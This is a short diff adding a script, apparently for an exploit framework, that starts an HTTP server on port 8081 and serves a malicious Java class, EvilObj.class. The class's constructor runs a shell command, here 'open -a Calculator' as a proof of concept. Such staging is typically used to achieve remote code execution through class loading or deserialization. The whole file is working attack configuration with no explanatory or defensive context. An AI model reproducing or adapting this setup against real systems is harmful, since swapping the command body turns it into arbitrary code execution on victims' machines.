@@ -1,0 +1,9 @@
+use exploit SimpleHTTPServer
+use payload EvilFileWrapper
+use bullet ClassWithEvilConstructor
+set lport 8081
+set path /EvilObj.class
+set classname EvilObj
+set body "open -a Calculator"
+set type class
+run
